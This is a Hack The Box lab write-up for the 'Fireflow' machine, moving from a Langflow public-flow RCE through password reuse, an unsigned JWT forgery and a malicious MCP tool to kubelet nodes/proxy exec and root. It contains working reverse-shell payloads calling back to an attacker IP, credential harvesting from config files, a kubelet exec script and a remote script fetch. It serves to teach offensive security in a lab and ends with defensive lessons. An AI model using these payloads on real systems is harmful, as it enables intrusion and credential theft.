# Fireflow - HTB Write-up

> **Scope note:** This write-up documents an authorized Hack The Box lab.

## Summary

Fireflow chains an unauthenticated Langflow public-flow RCE into credential reuse, then abuses an MCP registry that accepts unsigned JWTs. The resulting MCP pod has a Kubernetes service account with `nodes/proxy`, allowing command execution in a privileged node-exporter pod whose host filesystem is mounted at `/host/root`.

```text
Public Langflow flow ID
  -> CVE-2026-33017 RCE as www-data
  -> reused password / SSH as nightfall
  -> MCP configuration and service credentials
  -> unsigned admin JWT
  -> MCP tool RCE as mcp in Kubernetes
  -> nodes/proxy to privileged node-exporter
  -> host root filesystem / root flag
```

## Enumeration

Set target-specific values:

```bash
export TARGET=10.129.67.147
export LHOST=10.10.14.255
```

Initial scanning identified SSH, HTTP, and HTTPS:

```bash
nmap -p- --min-rate 1000 -T4 "$TARGET"
nmap -sC -sV -p 22,80,443 "$TARGET"
```

Add the discovered virtual hosts to `/etc/hosts`:

```text
10.129.67.147 fireflow.htb flow.fireflow.htb
```

The main site’s **Open Agent** link exposed a public Langflow Playground URL:

```text
https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
```

The UUID is the public flow ID:

```text
7d84d636-af65-42e4-ac38-26e867052c25
```

Fingerprint the backend:

```bash
curl -sk https://flow.fireflow.htb/api/v1/version | python3 -m json.tool
```

Output:

```json
{
  "version": "1.8.2",
  "main_version": "1.8.2",
  "package": "Langflow"
}
```

Langflow versions before 1.9.0 are affected by CVE-2026-33017. The public flow ID satisfies the prerequisite for the vulnerable public-flow build endpoint.

## Foothold - Langflow public-flow RCE

Start a listener on the attacking host. Use `10.10.14.255` as the callback address in the payload:

```bash
nc -lvnp 9001
```

The vulnerable endpoint accepts an attacker-controlled component definition. The component’s output function is executed when the temporary public flow is built. Save the following as `langflow-rce.json`:

```json
{
  "data": {
    "nodes": [
      {
        "id": "Exploit",
        "data": {
          "id": "Exploit",
          "type": "ExploitComp",
          "node": {
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "value": "from lfx.custom.custom_component.component import Component\\nfrom lfx.io import Output\\nfrom lfx.schema.data import Data\\n\\nclass ExploitComp(Component):\\n    display_name = \\"X\\"\\n    outputs = [Output(display_name=\\"O\\", name=\\"o\\", method=\\"r\\")]\\n    def r(self) -> Data:\\n        import os\\n        os.system(\\"bash -c 'bash -i >& /dev/tcp/10.10.14.255/9001 0>&1'\\")\\n        return Data(data={})"
              }
            },
            "outputs": [
              { "types": ["Data"], "name": "o", "method": "r" }
            ]
          }
        }
      }
    ],
    "edges": []
  }
}
```

Send the request:

```bash
curl -sk -X POST \
  'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  --data-binary @langflow-rce.json
```

The listener receives a shell as `www-data`. A simple PTY upgrade is enough for enumeration:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral movement - `nightfall`

The Langflow configuration exposes a superuser password and application secret:

```bash
cat /etc/langflow/.env
```

Relevant values:

```text
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
```

Identify interactive local users:

```bash
grep -E '/bin/(ba)?sh$' /etc/passwd
```

The password name hints at the `nightfall` user. It is reused for SSH:

```bash
ssh nightfall@fireflow.htb
# password: n1ghtm4r3_b4_n1ghtf4ll
```

```bash
id
cat ~/user.txt
```

```text
uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
FLAG
```

## MCP registry and JWT algorithm confusion

Hidden configuration in `nightfall`’s home directory provides credentials for a custom MCP service:

```bash
cat ~/.mcp/config.json
```

```json
{
  "server": "http://10.129.67.147:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

Enumerate the service:

```bash
curl -s http://10.129.67.147:30080/api/v1/version | python3 -m json.tool
```

The response reports JWT authentication and accepts both `HS256` and `none`. It also exposes an admin-only tool-registration endpoint:

```text
POST /api/v1/auth
GET  /api/v1/tools
POST /api/v1/tools [admin]
POST /mcp [MCP JSON-RPC 2.0]
```

Authenticate as the exposed service account:

```bash
USER_JWT=$(curl -s -X POST http://10.129.67.147:30080/api/v1/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

printf '%s' "$USER_JWT" | cut -d. -f2 | base64 -d 2>/dev/null; echo
```

The decoded claims show the role is only `user`:

```json
{"sub":"langflow-bot","role":"user"}
```

Because the server accepts `alg: none`, forge an unsigned token with an `admin` role:

```bash
ADMIN_JWT=$(python3 -c 'import base64,json; e=lambda x:base64.urlsafe_b64encode(json.dumps(x).encode()).rstrip(b"=").decode(); print(e({"alg":"none","typ":"JWT"})+"."+e({"sub":"attacker","role":"admin"})+".")')
echo "$ADMIN_JWT"
```

The trailing dot represents the empty JWT signature.

## MCP RCE

Start another listener on Kali:

```bash
nc -lvnp 9001
```

Register a malicious MCP tool using the forged admin token:

```bash
curl -s -X POST http://10.129.67.147:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name": "shell",
    "description": "debug shell",
    "inputSchema": {"type":"object","properties":{}},
    "code": "import socket,os,pty\\npid=os.fork()\\nif pid>0:\\n    import sys;sys.exit(0)\\nos.setsid()\\npid=os.fork()\\nif pid>0:\\n    import sys;sys.exit(0)\\ns=socket.socket()\\ns.connect((\\"10.10.14.255\\",9001))\\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\\npty.spawn(\\"/bin/sh\\")"
  }'
```

Invoke the tool through MCP JSON-RPC:

```bash
curl -s -X POST http://10.129.67.147:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

The listener receives a shell in a Kubernetes pod:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
id; hostname; pwd
```

```text
uid=1000(mcp) gid=1000(mcp) groups=1000(mcp)
mcp-server-<POD_SUFFIX>
/app
```

## Kubernetes enumeration

The pod contains a mounted Kubernetes service account. Query its effective RBAC permissions:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API=https://10.43.0.1:443

curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
  | python3 -c 'import sys,json; [print(r) for r in json.load(sys.stdin)["status"].get("resourceRules",[])]'
```

The important permission is:

```text
{'verbs': ['get'], 'apiGroups': [''], 'resources': ['nodes/proxy']}
```

`nodes/proxy` permits access to the kubelet API on a node. Query its pods and identify privileged containers with host-path mounts:

```bash
curl -sk "https://10.129.67.147:10250/pods" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c '
import sys,json
for item in json.load(sys.stdin)["items"]:
    vols=[v for v in item["spec"].get("volumes",[]) if "hostPath" in v]
    for c in item["spec"]["containers"]:
        if c.get("securityContext",{}).get("privileged") and vols:
            print(item["metadata"]["namespace"], item["metadata"]["name"], c["name"], [v["hostPath"]["path"] for v in vols])
'
```

This identifies the privileged node-exporter pod with `/` mounted from the host, accessible beneath `/host/root` inside the container.

## Root via kubelet `nodes/proxy`

Create `kube_exec.py` on the attacking machine, then transfer it to the MCP pod. It opens a WebSocket to the kubelet execution endpoint using the mounted service-account token:

```python
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE = "10.129.67.147"
NAMESPACE = "monitoring"
POD = "prometheus-prometheus-node-exporter-<POD_SUFFIX>"
CONTAINER = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def execute(command):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    args = '&'.join(f'command={part}' for part in command.split())
    url = f'wss://{NODE}:10250/exec/{NAMESPACE}/{POD}/{CONTAINER}?output=1&error=1&{args}'
    async with websockets.connect(
        url,
        ssl=context,
        additional_headers={'Authorization': f'Bearer {TOKEN}'},
        subprotocols=['v4.channel.k8s.io'],
        open_timeout=10,
    ) as websocket:
        try:
            while True:
                data = await asyncio.wait_for(websocket.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    print(data[1:].decode('utf-8', errors='replace'), end='')
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(execute(COMMAND))
```

Serve the script from Kali and fetch it in the MCP pod:

```bash
# Kali
sudo python3 -m http.server 80

# MCP pod
cd /tmp
curl http://10.10.14.255/kube_exec.py -o kube_exec.py
python3 kube_exec.py 'id'
```

Finally, read the root flag through the host filesystem mount:

```bash
python3 kube_exec.py 'cat /host/root/root/root.txt'
```

```text
<ROOT_FLAG>
```

## Lessons learned

- A public identifier can be sufficient to reach a dangerous unauthenticated code path.
- Application configuration files routinely contain high-value credentials and signing material.
- A JWT must enforce an algorithm allow-list server-side; accepting `none` enables role forgery.
- An MCP tool registry must never execute arbitrary user-provided code.
- Kubernetes `nodes/proxy` is highly sensitive: it can bridge RBAC permissions into kubelet access.
- Privileged pods with host-path mounts can turn kubelet command execution into host compromise.
